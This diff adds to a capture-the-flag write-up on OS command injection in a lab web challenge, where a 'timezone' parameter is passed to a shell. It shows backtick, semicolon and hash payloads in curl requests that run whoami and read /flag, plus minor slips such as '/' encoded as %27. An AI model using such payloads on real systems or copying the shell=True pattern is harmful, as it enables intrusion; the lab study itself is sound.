@@ -38,3 +38,131 @@ def level2():
     timezone = request.args.get("timezone", "UTC")
     return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
 ```
+
+As we can see, the server takes the argument given to the `timezone` parameter.
+
+It then inserts the argument in the shell command to retrieve the date.
+
+```
+## Resultant command
+TZ={timezone} date
+```
+
+From the abocve command, the shell set the environment variable `TZ` to our inserted argument and then executes the `date` command in that context.
+
+We can provide `UTC` as the argument and see what output it provides.
+
+```
+## Request
+http://challenge.localhost/?timezone=UTC
+
+## Resultant Command
+TZ=UTC date
+```
+
+![image](https://github.com/Kunull/Write-ups/assets/110326359/73567980-d93d-452c-af32-4b401ba92097)
+
+Now let's try the same with `MST` as the argument.
+
+```
+## Request
+http://challenge.localhost/?timezone=UTC
+
+## Resultant Command
+TZ=MST date
+```
+
+![image](https://github.com/Kunull/Write-ups/assets/110326359/4baabe84-7bd9-4b78-95d5-a407b95b658e)
+
+As we can see in the third command of both examples and the `Result`, the `date` command is influenced by the value of the `TZ` variable, which we control.
+
+### Injection
+
+#### Backticks ```
+
+If we provide the `whoami` command with backticks ```, the shell executes the command within the backticks and substitutes it's result in the 
+
+```
+## Request
+http://challenge.localhost/?timezone=`whoami`
+
+## Resultant Command
+TZ=`whoami` date
+```
+
+![image](https://github.com/Kunull/Write-ups/assets/110326359/e8bd69b6-6261-4df3-b7a5-4013c3a4e550)
+
+Once it has the result for the `whoami` command, the shell will substitute the result in the `TZ` variable.
+
+```
+## Resultant Command
+TZ=root date
+```
+
+![image](https://github.com/Kunull/Write-ups/assets/110326359/5558b05c-23df-461d-9b37-9c5c92449089)
+
+```
+hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=`whoami`'
+Wed Jun  5 04:12:07 root 2024
+```
+
+#### Semicolon `;`
+
+If we use the semicolon `;` character, it ends the current shell statement and begins a new shell statement.
+
+```
+## Request
+http://challenge.localhost/?timezone=;whoami;
+
+## Resultant Command
+TZ=;
+root;
+date
+```
+
+While sending the request, we have to URI encode the `;` character with `%3B`.
+
+```
+hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bwhoami%3B'
+root
+Wed Jun  5 04:20:22 UTC 2024
+```
+
+#### Hash `#`
+
+If we use the hash `#` character, it comments out everything that comes afterwards.
+
+```
+## Request
+http://challenge.localhost/?timezone=;whoami;#
+
+## Resultant Command
+TZ=;
+root;
+#date    ## The date cpmmand is commented out
+```
+
+While sending the request, we have to URI encode the `#` character with `%23`.
+
+```
+hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bwhoami%3B%23'
+root
+```
+
+Now, we can use all of these concepts to `cat` out the `/flag` file.
+
+```
+## Request
+http://challenge.localhost/?timezone=;cat /flag;#
+
+## Resultant Command
+TZ=;
+cat /flag;
+#date    ## The date cpmmand is commented out
+```
+
+While sending the request, we have to URI encode the ` ` character with `%20`  and the `/` character with `%27`.
+
+```
+hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bcat%20%2Fflag%3B%23'
+```
